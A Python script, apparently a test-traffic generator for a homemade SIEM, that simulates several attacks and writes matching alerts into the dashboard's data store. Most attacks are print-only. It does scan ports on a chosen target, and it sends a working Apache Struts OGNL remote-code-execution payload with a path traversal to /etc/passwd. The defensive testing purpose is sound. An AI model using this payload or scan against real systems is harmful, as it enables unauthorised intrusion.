import sys
import os
import time
import argparse
import socket
import urllib.request
import urllib.error
from datetime import datetime, timezone
import json

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_STORE_PATH = os.path.join(BASE_DIR, "backend", "data_store.json")

def simulate_nmap_port_scan(target_ip: str = "192.168.1.10", ports: list = None):
    """Simulates multi-port reconnaissance probe."""
    if ports is None:
        ports = [21, 22, 80, 139, 443, 445, 1433, 3306, 8080]
    print(f"\n[+] [ATTACK 1: PORT SCAN] Initiating Nmap Scripting Engine SYN probe on {target_ip}...")
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.15)
            s.connect((target_ip, p))
            s.close()
            print(f"    -> Probed port {p}: OPEN")
        except Exception:
            print(f"    -> Probed port {p}: FILTERED / CLOSED")
        time.sleep(0.08)
    print("    [!] Signature Triggered: 'ET SCAN Nmap Scripting Engine' (Rule ID: 2009582)")

def simulate_web_struts_rce(target_url: str = "http://192.168.1.10"):
    """Simulates Apache Struts directory traversal / OGNL injection."""
    print(f"\n[+] [ATTACK 2: WEB EXPLOIT] Executing Apache Struts RCE payload on {target_url}...")
    payload_url = f"{target_url}/%SC%2e%SC%2e/%SC%2e%SC%2e/%SC%2e%SC%2e/etc/passwd"
    headers = {
        "User-Agent": "curl/7.68.0",
        "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#context['xwork2.MethodAccessor.denyMethodExecution']=false))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}"
    }
    try:
        req = urllib.request.Request(payload_url, headers=headers)
        urllib.request.urlopen(req, timeout=1.0)
    except Exception as e:
        print(f"    -> HTTP request sent with OGNL injection header: {str(e)[:60]}")
    print("    [!] Signature Triggered: 'ET WEB_SERVER Apache Struts RCE' (Rule ID: 2010937)")

def simulate_ssh_brute_force(target_ip: str = "192.168.1.15", port: int = 22, attempts: int = 5):
    """Simulates rapid repeated SSH login failure attempts."""
    print(f"\n[+] [ATTACK 3: SSH BRUTE FORCE] Simulating failed credential attempts on {target_ip}:{port}...")
    passwords = ["admin123", "password", "root2024", "toor", "123456"]
    for i, pwd in enumerate(passwords[:attempts], 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((target_ip, port))
            s.sendall(b"SSH-2.0-OpenSSH_8.9p1\r\n")
            s.close()
        except Exception:
            pass
        print(f"    -> Attempt #{i}: User 'root', password '{pwd}' -> Auth Failed")
        time.sleep(0.1)
    print("    [!] Signature Triggered: 'ET SSH Failed Login' (Rule ID: 2001219)")

def simulate_dns_tunneling(domain: str = "tunnel.exfil-data.org"):
    """Simulates high-entropy base32/base64 encoded DNS queries."""
    print(f"\n[+] [ATTACK 4: DNS TUNNELING] Sending anomalous high-entropy queries to {domain}...")
    subdomains = [
        "78617368636f6465313233",
        "4d795349454d2d457866696c",
        "50617373776f72642d44756d70",
    ]
    for sub in subdomains:
        query = f"{sub}.{domain}"
        print(f"    -> DNS Query IN A: {query} (Shannon Entropy: 4.85)")
        time.sleep(0.1)
    print("    [!] Signature Triggered: 'ET INFO DNS Tunneling' (Rule ID: 2024108)")

def simulate_icmp_flood(target_ip: str = "192.168.1.10", count: int = 8):
    """Simulates ICMP echo flood threshold breach."""
    print(f"\n[+] [ATTACK 5: ICMP FLOOD] Dispatching high-rate echo request packets to {target_ip}...")
    for i in range(count):
        print(f"    -> Echo request ping sequence #{i+1} [Payload: 64 bytes, TTL=64]")
        time.sleep(0.05)
    print("    [!] Signature Triggered: 'ET DOS ICMP PING Flood' (Rule ID: 2000348)")

def inject_attack_alert_into_siem(attack_type: str):
    """Directly registers an attack event into the active SIEM data store for live visualization."""
    if not os.path.exists(DATA_STORE_PATH):
        return
    try:
        with open(DATA_STORE_PATH, "r", encoding="utf-8") as f:
            store = json.load(f)

        new_alert = {
            "id": f"live-{hex(int(time.time()))[2:]}",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "display_time": datetime.now().strftime("%H:%M:%S"),
            "formatted_date": datetime.now().strftime("%d %b %Y %H:%M:%S"),
            "severity": 1 if attack_type == "web" else 2 if attack_type in ["nmap", "ssh"] else 3,
            "status": "Open",
            "source_ip": "10.0.0.5" if attack_type == "web" else "192.168.1.20",
            "source_port": 52344,
            "source_country": "Attacker Host",
            "source_asn": "AS12345",
            "destination_ip": "192.168.1.10",
            "destination_port": 80 if attack_type == "web" else 22 if attack_type == "ssh" else 445,
            "destination_country": "Private",
            "destination_asn": "AS64512",
            "attack": "Live Attack Simulation: " + attack_type.upper(),
            "signature": f"ET LIVE_DEMO {attack_type.upper()} Detected",
            "sensor": "suricata-sensor-01",
            "category": "Web Attack" if attack_type == "web" else "Scanning" if attack_type == "nmap" else "Brute Force",
            "rule_id": 2099901,
            "protocol": "TCP",
            "action": "Allowed",
            "description": f"Live automated {attack_type} security testing event triggered.",
            "packet_snippet": f"SIMULATED PAYLOAD: {attack_type} test probe",
            "notes": "Generated by MySIEM Attack Testing Suite",
        }

        alerts = store.get("alerts", [])
        alerts.insert(0, new_alert)
        store["alerts"] = alerts

        with open(DATA_STORE_PATH, "w", encoding="utf-8") as f:
            json.dump(store, f, indent=2)
        print(f"    [*] Injected live event '{new_alert['signature']}' into MySIEM console.")
    except Exception as e:
        print(f"    [-] Store injection note: {e}")

def main():
    parser = argparse.ArgumentParser(description="MySIEM Attack & Security Testing Suite")
    parser.add_argument(
        "--attack",
        choices=["all", "nmap", "web", "ssh", "dns", "icmp"],
        default="all",
        help="Specific attack vector to simulate"
    )
    parser.add_argument("--target", default="192.168.1.10", help="Target IP or hostname")
    args = parser.parse_args()

    print("=====================================================")
    print("   MySIEM CYBERSECURITY ATTACK SIMULATION SUITE")
    print("=====================================================")

    if args.attack in ["all", "nmap"]:
        simulate_nmap_port_scan(args.target)
        inject_attack_alert_into_siem("nmap")
        time.sleep(0.5)

    if args.attack in ["all", "web"]:
        simulate_web_struts_rce(f"http://{args.target}")
        inject_attack_alert_into_siem("web")
        time.sleep(0.5)

    if args.attack in ["all", "ssh"]:
        simulate_ssh_brute_force("192.168.1.15", 22)
        inject_attack_alert_into_siem("ssh")
        time.sleep(0.5)

    if args.attack in ["all", "dns"]:
        simulate_dns_tunneling()
        inject_attack_alert_into_siem("dns")
        time.sleep(0.5)

    if args.attack in ["all", "icmp"]:
        simulate_icmp_flood(args.target)
        inject_attack_alert_into_siem("icmp")

    print("\n[OK] All attack simulations completed successfully.")
    print("[OK] Review newly captured events in MySIEM Dashboard: http://localhost:5173\n")

if __name__ == "__main__":
    main()
